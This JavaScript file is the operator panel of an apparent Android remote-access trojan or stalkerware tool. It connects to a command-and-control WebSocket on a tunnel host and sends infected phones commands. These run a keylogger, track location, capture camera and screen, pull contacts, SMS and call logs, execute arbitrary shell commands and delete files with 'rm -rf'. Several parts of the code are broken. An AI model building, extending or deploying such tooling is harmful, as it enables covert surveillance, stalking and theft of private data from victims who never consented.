const BASE_URL = 'wss://diagnostic-difficulties-steam-fisher.trycloudflare.com:6050/ws';
const deviceId = localStorage.getItem('deviceId') || uuid.v4();
localStorage.setItem('deviceId', deviceId);

let ws;
let selectedDeviceId = null;
let reconnectTimer = null;
let pendingRequests = {};

const uuid = function() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0;
        const v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
};

const uuidv4 = uuid;

// Initialize WebSocket
function initWS() {
    ws = new WebSocketChannel(WebSocket, BASE_URL + '?device_id=' + deviceId);
    
    ws.onopen = () => {
        updateConnectionStatus('Online', 'online');
        clearReconnectBanner();
        requestDeviceList();
    };

    ws.onmessage = (event) => {
        const msg = JSON.parse(event.data);
        handleMessage(msg);
    };

    ws.onclose = () => {
        updateConnectionStatus('Offline', 'offline');
        showReconnectBanner();
        reconnectTimer = setTimeout(initWS, 3000);
    };

    ws.onerror = (err) => {
        console.error('WS error:', err);
    };
}

// Handle incoming messages
function handleMessage(msg) {
    if (msg.type === 'connected') {
        // Device connected
        return;
    }

    if (msg.type === 'response') {
        const reqId = msg.request_id;
        if (pendingRequests[reqId]) {
            const handler = pendingRequests[reqId];
            delete pendingRequests[reqId];
            handler(msg);
        }
        return;
    }

    if (msg.type === 'event') {
        displayEvent(msg);
        return;
    }

    if (msg.type === 'device_connected') {
        addDeviceToList(msg.device_id);
        return;
    }

    if (msg.type === 'device_disconnected') {
        removeDeviceFromList(msg.device_id);
        return;
    }
}

// Update device selector
function updateDeviceSelector() {
    const selector = document.getElementById('deviceSelector');
    // Fetch connected devices from server
    // This would be populated via WebSocket events
}

// Show reconnect banner
function showReconnectBanner() {
    const banner = document.createElement('div');
    banner.className = 'banner';
    banner.innerHTML = `
        <span>Koneksi terputus, mencoba menghubungkan ulang...</span>
        <button id="reconnectBtn">Reconnect</button>
    `;
    document.queryContainer.insertBefore(banner, document.querySelector('.content'));
    document.getElementById('reconnectBtn').onclick = reconnectWS;
}

// Hide reconnect banner
function clearReconnectBanner() {
    const banner = document.querySelector('.banner');
    if (banner) banner.remove();
}

// Update connection status
function updateConnectionStatus(status, className) {
    const statusEl = document.getElementById('connectionStatus');
    statusEl.textContent = status;
    statusEl.className = 'status-' + className;
}

// Request device list from server
function requestDeviceList() {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
            type: 'get_devices'
        }));
    }
}

// Add device to UI
function addDeviceToList(deviceId) {
    const selector = document.getElementById('deviceSelector');
    const option = document.createElement('option');
    option.value = deviceId;
    option.textContent = 'Device ' + deviceId.substring(0, 8);
    selector.appendChild(option);
}

// Remove device from UI
function removeDeviceFromList(deviceId) {
    const selector = document.getElementById('deviceSelector');
    const option = selector.querySelector('option[value="' + deviceId + '"]');
    if (option) option.remove();
}

// Connect to selected device
function connectDevice(deviceId) {
    selectedDeviceId = deviceId;
    // Send initial sync
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
            type: 'command',
            target_device_id: deviceId,
            action: 'get_device_info',
            request_id: uuidv4()
        }));
    }
}

// Execute command
function executeCommand(action, payload) {
    if (!selectedDeviceId) {
        showToast('Pilih device terlebih dahulu');
        return;
    }

    const requestId = uuidv4();
    pendingRequests[requestId] = (response) => {
        updateCommandStatus(action, response);
    };

    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
            type: 'command',
            target_device_id: selectedDeviceId,
            action: action,
            request_id: requestId,
            payload: payload || {}
        }));
    }
}

// Update command status UI
function updateCommandStatus(action, response) {
    const statusEl = document.querySelector('.card .status');
    if (response.status === 'ok') {
        showToast('Command executed successfully');
    } else {
        showToast('Error: ' + (response.message || 'Unknown error'));
    }
}

// Show toast
function showToast(message) {
    // Create toast element
    const toast = document.createElement('div');
    toast.style.position = 'fixed';
    toast.style.bottom = '24px';
    toast.style.left = '50%';
    toast.style.transform = 'translateX(-50%)';
    toast.style.background = 'var(--accent-cyan)';
    toast.color = 'var(--bg-main)';
    toast.padding = '12px 24px';
    toast.borderRadius = '6px';
    toast.textContent = message;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

// WiFi scan
function scanWiFi() {
    executeCommand('wifi_scan');
}

// Get saved WiFi
function getSavedWiFi() {
    executeCommand('get_saved_wifi');
}

// File browser operations
function browseFiles(path) {
    executeCommand('list_files', { path: path });
}

function downloadFile(filePath) {
    executeCommand('run_shell', { command: 'cat ' + filePath });
}

function deleteFile(filePath) {
    executeCommand('delete_file', { path: filePath });
}

// Shell command
function executeShell() {
    const cmd = document.getElementById('shellCommand').value;
    executeCommand('run_shell', { command: cmd });
    document.getElementById('shellCommand').value = '';
}

// Keylogger toggle
function toggleKeylog() {
    executeCommand('start_keylog');
}

// Location tracking
function startTracking() {
    executeCommand('start_location_tracking');
}

function stopTracking() {
    executeCommand('stop_location_tracking');
}

function getCurrentLocation() {
    executeCommand('get_location_once');
}

// Volume control
function setVolume(level) {
    executeCommand('set_volume', { level: level });
}

// Vibration
function vibrate(duration) {
    executeCommand('vibrate', { duration: duration });
}

// Screen record
function startScreenRecord() {
    executeCommand('start_screen_record');
}

function stopScreenRecord() {
    executeCommand('stop_screen_record');
}

// Screenshot
function takeScreenshot() {
    executeCommand('take_screenshot');
}

// Camera capture
function captureFront() {
    executeCommand('start_camera_capture', { camera: 'front' });
}

function captureBack() {
    executeCommand('start_camera_capture', { camera: 'back' });
}

function stopCameraCapture() {
    executeCommand('stop_camera_capture');
}

// Flash control
function toggleFlash(on) {
    executeCommand(on ? 'flash_on' : 'flash_off');
}

// Ringer mode
function setRingerMode(mode) {
    executeCommand('set_ringer_mode', { mode: mode });
}

// Lock screen
function lockDevice() {
    executeCommand('lock_screen');
}

// Turn off screen
function turnOffScreen() {
    executeCommand('turn_off_screen');
}

// Reboot device
function rebootDevice() {
    const confirm = document.getElementById('rebootConfirm').value;
    if (confirm === 'REBOOT') {
        executeCommand('reboot');
        document.getElementById('rebootConfirm').value = '';
    } else {
        showToast('Ketik "REBOOT" untuk konfirmasi');
    }
}

// Shutdown device
function shutdownDevice() {
    const confirm = document.getElementById('shutdownConfirm').value;
    if (confirm === 'WIPE') {
        executeCommand('shutdown');
        document.getElementById('shutdownConfirm').value = '';
    } else {
        showToast('Ketik "WIPE" untuk konfirmasi');
    }
}

// Notification handling
function displayEvent(msg) {
    const feed = document.getElementById('notifFeed');
    const div = document.createElement('div');
    div.textContent = new Date(msg.timestamp).toLocaleString() + ' - ' + (msg.payload?.text || '');
    feed.appendChild(div);
    if (feed.children.length > 50) feed.removeChild(feed.firstChild);
}

// Connect WebSocket on load
initWS();

// Event listeners
document.getElementById('deviceSelector').onchange = (e) => connectDevice(e.target.value);
document.getElementById('refreshBtn').onclick = requestDeviceList;
document.getElementById('flashToggle').onchange = (e) => toggleFlash(e.target.checked);
document.getElementById('lockToggle').onchange = (e) => lockDevice();
document.getElementById('offScreenBtn').onclick = turnOffScreen;
document.getElementById('vibrateSlider').oninput = (e) => vibrate(parseInt(e.target.value));
document.getElementById('testVibrate').onclick = () => vibrate(500);
document.getElementById('volumeSlider').oninput = (e) => setVolume(parseInt(e.target.value));
document.getElementById('setVolume').onclick = () => setVolume(parseInt(document.getElementById('volumeSlider').value));
document.getElementById('muteToggle').onchange = (e) => executeCommand('set_ringer_mode', { mode: e.target.checked ? 'silent' : 'normal' });
document.getElementById('rebootBtn').onclick = rebootDevice;
document.getElementById('shutdownBtn').onclick = shutdownDevice;
document.getElementById('camFrontBtn').onclick = captureFront;
document.getElementById('camBackBtn').onclick = captureBack;
document.getElementById('stopCameraCapture').onclick = stopCameraCapture;
document.getElementById('recAudioStart').onclick = startScreenRecord; // Placeholder
document.getElementById('recAudioStop').onclick = stopScreenRecord; // Placeholder
document.getElementById('screenRecStart').onclick = startScreenRecord;
document.getElementById('screenRecStop').onclick = stopScreenRecord;
document.getElementById('screenshotBtn').onclick = takeScreenshot;
document.getElementById('keylogToggle').onchange = (e) => toggleKeylog(e.target.checked);
document.getElementById('trackStart').onclick = startTracking;
document.getElementById('trackStop').onclick = stopTracking;
document.getElementById('trackInterval').oninput = (e) => document.getElementById('trackIntervalValue').textContent = e.target.value;
document.getElementById('getLocation').onclick = getCurrentLocation;
document.getElementById('extractContacts').onclick = () => executeCommand('get_contacts');
document.getElementById('extractSms').onclick = () => executeCommand('get_sms');
document.getElementById('extractCalls').onclick = () => executeCommand('get_call_log');
document.getElementById('refreshApps').onclick = () => executeCommand('get_installed_apps');
document.getElementById('refreshRunning').onclick = () => executeCommand('get_running_apps');
document.getElementById('clearScreenshots').onclick = () => executeCommand('run_shell', { command: 'rm -rf /storage/emulated/0/Pictures/Screenshots/*' });
document.getElementById('wipeBtn').onclick = shutdownDevice;
document.getElementById('executeCmd').onclick = executeShell;
document.getElementById('shellCommand').onkeypress = (e) => e.key === 'Enter' && executeShell();
document.getElementById('fileDownload').onclick = () => downloadFile(document.getElementById('filePath').value);
document.getElementById('fileDelete').onclick = () => deleteFile(document.getElementById('filePath').value);
document.getElementById('clearLog').onclick = () => {
    document.getElementById('activityLog').innerHTML = '';
};